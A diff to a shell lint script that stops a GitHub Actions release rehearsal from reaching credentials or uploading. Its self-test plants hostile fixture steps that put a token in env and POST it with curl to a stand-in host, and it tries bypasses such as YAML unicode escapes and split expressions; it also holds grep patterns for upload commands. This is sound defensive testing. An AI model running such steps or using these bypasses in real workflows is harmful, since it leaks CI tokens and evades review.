@@ -15,11 +15,13 @@
 #   - the token cannot write: workflow permissions exactly contents: read, no job-level
 #     permissions, no environment (environment secrets), no reusable-workflow call;
 #   - no credential is reachable from an expression: the words `secrets` and `vars`
-#     appear nowhere in the file, in any case or access form (secrets.X, secrets['X'],
-#     toJSON(secrets)), and inside ${{ }} `github` is read one named property at a
-#     time, never `token` (so no github['token'], toJSON(github) or format() form). A
-#     context is an identifier; an expression cannot build its name from a string, so
-#     there is no other spelling.
+#     appear nowhere in the file or in its parsed form, in any case or access form
+#     (secrets.X, secrets['X'], toJSON(secrets)), and `github` appears only as
+#     ${{ github.job }}, ${{ github.sha }} or a github.com URL (so no github.token,
+#     github['token'], github.*, toJSON(github) or format() form). A context is an
+#     identifier; an expression cannot build its name from a string, so there is no
+#     other spelling. The parsed form puts YAML escapes and multi-line expressions in
+#     scope.
 # A step that POSTs in any form then has nothing to write with. The rest is the
 # envelope: triggers exactly schedule + dispatch, every job starting with the
 # credential guard, no step `if:` at all (it can run past the guard), workflow and job
@@ -105,7 +107,7 @@ EOF
 
 # lint FILE: every property that keeps the rehearsal from uploading. One line per failure.
 lint() {
-    local f=$1 bad=0 v g
+    local f=$1 bad=0 v g t
     need_yq
     [ -f "$f" ] || die "lint: no such file $f"
     v=$("$YQ" -o=json -I=0 '.permissions' "$f")
@@ -140,16 +142,21 @@ lint() {
     [ -z "$v" ] || { echo "lint: job key(s) outside the allowlist (they act before the credential guard): $v"; bad=1; }
     v=$("$YQ" '[.jobs[] | (.env // {}) | keys[] | select(test("^(MACOSX_DEPLOYMENT_TARGET)$") | not)] | unique | join(" ")' "$f")
     [ -z "$v" ] || { echo "lint: job env name(s) outside the allowlist (they act before the credential guard): $v"; bad=1; }
-    # No credential is reachable from an expression. `secrets` and `vars` are banned as
-    # words anywhere in the file, in any case, so every access form is caught (secrets.X,
-    # secrets['X'], toJSON(secrets)). Inside ${{ }}, `github` may only be read one named
-    # property at a time and never `token`: github['token'] or toJSON(github) would
-    # reach the job token another way.
-    if grep -n -i -E '(^|[^A-Za-z0-9_])(secrets|vars)([^A-Za-z0-9_]|$)' "$f"; then
+    # No credential is reachable from an expression. The text checked is the file plus
+    # the parsed document (aliases expanded, one-line JSON), so a `$` or a letter written
+    # as a YAML double-quoted escape, and an expression split across lines, are both in
+    # it. `secrets` and `vars` are banned there as words, in any case, so every access
+    # form is caught.
+    # `github` is banned the same way outside three exact forms, `${{ github.job }}`,
+    # `${{ github.sha }}` and an https://github.com/ URL, each blanked to a space first:
+    # github.token, github['token'], github.*, toJSON(github) and format() all leave a
+    # `github` word behind. No expression is parsed, so there is no parse to get wrong.
+    t=$(cat "$f" && "$YQ" -o=json -I=0 'explode(.)' "$f") || { echo "lint: yq cannot parse $f"; bad=1; }
+    if printf '%s\n' "$t" | grep -n -i -E '(^|[^A-Za-z0-9_])(secrets|vars)([^A-Za-z0-9_]|$)'; then
         echo "lint: a secrets or vars reference (a credential reachable from an expression)"; bad=1
     fi
-    if grep -o -i -E '\$\{\{.*\}\}' "$f" | grep -i -E '(^|[^A-Za-z0-9_.])github( *[^ .A-Za-z0-9_]| *$| *\. *token([^A-Za-z0-9_]|$))'; then
-        echo "lint: the job token reachable from an expression (github.token, github[...] or a whole github context)"; bad=1
+    if printf '%s\n' "$t" | sed -e 's/\${{ github\.job }}/ /g' -e 's/\${{ github\.sha }}/ /g' -e 's#https://github\.com/# #g' | grep -n -i -E '(^|[^A-Za-z0-9_])github([^A-Za-z0-9_]|$)'; then
+        echo "lint: the job token reachable from an expression (a github reference outside \${{ github.job }}, \${{ github.sha }} and a github.com URL)"; bad=1
     fi
     if grep -n -E 'uploads\.github\.com|-X ?.?(POST|PUT|PATCH|DELETE)|--request[ =].?(POST|PUT|PATCH|DELETE)|gh (release|api)|cargo publish|github\.event\.release|inputs\.tag' "$f"; then
         echo "lint: an upload, a release write or a release-event input"; bad=1
@@ -261,7 +268,7 @@ self_test() {
     # one a review found: a later step that maps the credential into its env and POSTs
     # with curl -d, which no upload pattern names.
     credrow() {
-        V="$1" "$YQ" '.jobs["build-apr-cpu"].steps[1].env.T = strenv(V) | .jobs["build-apr-cpu"].steps[1].run = "curl -H \"authorization: token $T\" -d @x https://api.github.com/repos/o/r/releases"' "$d/fx.yml" > "$d/m.yml"
+        V="$1" "$YQ" '.jobs["build-apr-cpu"].steps[1].env.T = strenv(V) | .jobs["build-apr-cpu"].steps[1].run = "curl -H \"authorization: token $T\" -d @x https://example.invalid/repos/o/r/releases"' "$d/fx.yml" > "$d/m.yml"
         out=$(lint "$d/m.yml"); row "a later step with env T: $1 and curl -d -> lint red" 1 $? "$2" "$out"
     }
     credrow '${{ secrets.GITHUB_TOKEN }}' 'secrets or vars'
@@ -275,6 +282,20 @@ self_test() {
     credrow '${{ toJSON(github) }}' 'job token reachable'
     credrow '${{ fromJSON(toJSON(github)).token }}' 'job token reachable'
     credrow "\${{ format('{0}', github) }}" 'job token reachable'
+    credrow '${{ toJSON(github.*) }}' 'job token reachable'
+    credrow "\${{ github
+      .token }}" 'job token reachable'
+    # A YAML double-quoted escape is decoded before Actions reads the expression, so the
+    # raw text never shows the word; the parsed form does. The escapes are built here,
+    # not written out, so this file never holds one either.
+    escrow() { # escrow VALUE PATTERN: VALUE goes in as a double-quoted YAML scalar
+        V=PLANTED "$YQ" '.jobs["build-apr-cpu"].steps[1].env.T = strenv(V) | .jobs["build-apr-cpu"].steps[1].run = "curl -d @x https://example.invalid/"' "$d/fx.yml" > "$d/m0.yml"
+        local y; y=$(< "$d/m0.yml"); printf '%s\n' "${y/PLANTED/"\"$1\""}" > "$d/m.yml"
+        out=$(lint "$d/m.yml"); row "a later step with env T: \"$1\" (escaped) and curl -d -> lint red" 1 $? "$2" "$out"
+    }
+    esc_dollar=$(printf '\\%s' u0024); esc_g=$(printf '\\%s' u0067); esc_s=$(printf '\\%s' u0073)
+    escrow "${esc_dollar}{{ ${esc_g}ithub.token }}" 'job token reachable'
+    escrow "${esc_dollar}{{ ${esc_s}ecrets.GH_TOKEN }}" 'secrets or vars'
     # Without a credential the same POST has nothing to write with: lint stays green, and
     # the reading of github that the release's steps use stays green with it.
     credrow_green() {
@@ -282,7 +303,7 @@ self_test() {
         out=$(lint "$d/m.yml"); row "a later step with env T: $1 and curl -d, no credential -> still cannot upload" 0 $? 'cannot upload' "$out"
     }
     credrow_green '${{ github.sha }}'
-    credrow_green '${{ github.job }}-${{ github.run_id }}'
+    credrow_green '${{ github.job }}-${{ strategy.job-index }}'
     mut '.jobs["build-apr-cuda"].steps += [{"name": "up", "run": "curl -sSf -X POST --data-binary @a https://uploads.github.com/x"}]'
     out=$(lint "$d/m.yml"); row "a planted upload step -> lint red" 1 $? 'upload' "$out"
     mut '.jobs["build-apr-cuda"].steps += [{"name": "up", "run": "gh release upload v1 a.tar.gz"}]'
